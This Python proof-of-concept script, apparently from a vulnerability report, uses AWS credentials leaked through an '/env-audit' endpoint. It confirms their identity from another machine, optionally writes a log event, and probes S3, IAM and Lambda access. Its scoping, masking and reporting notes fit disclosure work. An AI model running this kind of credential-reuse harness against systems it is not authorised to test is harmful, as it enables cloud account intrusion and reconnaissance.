#!/usr/bin/env python3
"""Use the captured credentials from a laptop.

Reads `out/response.json` (the reveal response from /env-audit), puts the three
AWS values into the environment of a *child* process only — they are never
exported into the shell that runs this — and asks AWS who it is.

    python3 poc/offhost_check.py            # identity only
    python3 poc/offhost_check.py --write    # + the own-log-group write
    python3 poc/offhost_check.py --probe    # + read-only boundary probes

`--write` creates a log stream and puts one event in the function's *own* log
group, which is the one permitted write in the original run. `--probe` is marked
separately because those reads were **not** part of the original evidence — the
2026-05 run stopped after identity and the log write. Running them here measures
your run, not mine.

The `aws` CLI must be on PATH and configured with nothing else: this script
overrides the credential variables in the child environment.
"""

import json
import os
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, HERE)
from redact import mask_text  # noqa: E402


def load():
    path = os.path.join(ROOT, "out", "response.json")
    if not os.path.exists(path):
        sys.exit("no %s — run poc/fetch.sh first" % path)
    doc = json.load(open(path, encoding="utf-8"))
    creds = {
        "access_key_id": doc.get("aws_access_key_id"),
        "secret_access_key": doc.get("aws_secret_access_key"),
        "session_token": doc.get("aws_session_token"),
    }
    if not creds["access_key_id"] or not creds["secret_access_key"]:
        sys.exit("credentials withheld in that response; run poc/fetch.sh --reveal")
    return doc, creds


def env_for(doc, creds, drop_session_token=False):
    """A copy of the environment with the credential variables replaced."""
    env = dict(os.environ)
    for k in ("AWS_PROFILE", "AWS_DEFAULT_PROFILE", "AWS_CONFIG_FILE"):
        env.pop(k, None)
    env["AWS_ACCESS_KEY_ID"] = creds["access_key_id"]
    env["AWS_SECRET_ACCESS_KEY"] = creds["secret_access_key"]
    if not drop_session_token:
        env["AWS_SESSION_TOKEN"] = creds["session_token"]
    env["AWS_REGION"] = env["AWS_DEFAULT_REGION"] = doc.get("aws_region") or "us-east-1"
    return env


def aws(env, *args, **kw):
    p = subprocess.run(["aws", *args], env=env, capture_output=True, text=True)
    out = (p.stdout or p.stderr).strip()
    return p.returncode, mask_text(out)


def main(argv):
    doc, creds = load()
    env = env_for(doc, creds)

    print("# identity, from this machine")
    rc, out = aws(env, "sts", "get-caller-identity", "--output", "json")
    print(out)
    if rc != 0:
        return rc
    idn = json.loads(out)

    print("\n# the credential proves identity, not permission")
    print("account: %s | role: %s" % (idn.get("Account"), idn.get("Arn")))

    if "--write" in argv:
        group = doc.get("aws_log_group") or ""
        stream = "poc-%d" % int(time.time())
        print("\n# own-log-group write (the one permitted mutation)")
        print("log group: %s" % group)
        rc, out = aws(env, "logs", "create-log-stream", "--log-group-name", group,
                      "--log-stream-name", stream)
        print("create-log-stream -> rc=%d %s" % (rc, out or "(200, no body)"))
        events = json.dumps([{"timestamp": int(time.time() * 1000),
                              "message": "credential used off-host; poc harness"}])
        rc, out = aws(env, "logs", "put-log-events", "--log-group-name", group,
                      "--log-stream-name", stream, "--log-events", events)
        print("put-log-events    -> rc=%d %s" % (rc, out))
        print("a nextSequenceToken in that response means the events were accepted")

    if "--probe" in argv:
        print("\n# read-only boundary probes (NOT part of the original evidence)")
        probes = [
            ("s3 buckets", ["s3", "ls"]),
            ("iam user", ["iam", "get-user"]),
            ("lambda list", ["lambda", "list-functions"]),
            ("log groups", ["logs", "describe-log-groups"]),
        ]
        for label, args in probes:
            rc, out = aws(env, *args)
            verdict = "ALLOWED" if rc == 0 else "denied (%s)" % (out.splitlines()[0][:120] if out else "rc=%d" % rc)
            print("%-14s %s" % (label, verdict))
        print("\nEvery 'denied' line here is a boundary that held. If any probe says")
        print("ALLOWED, that is new information and it changes the severity — report it")
        print("with the output, not the assumption.")

    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
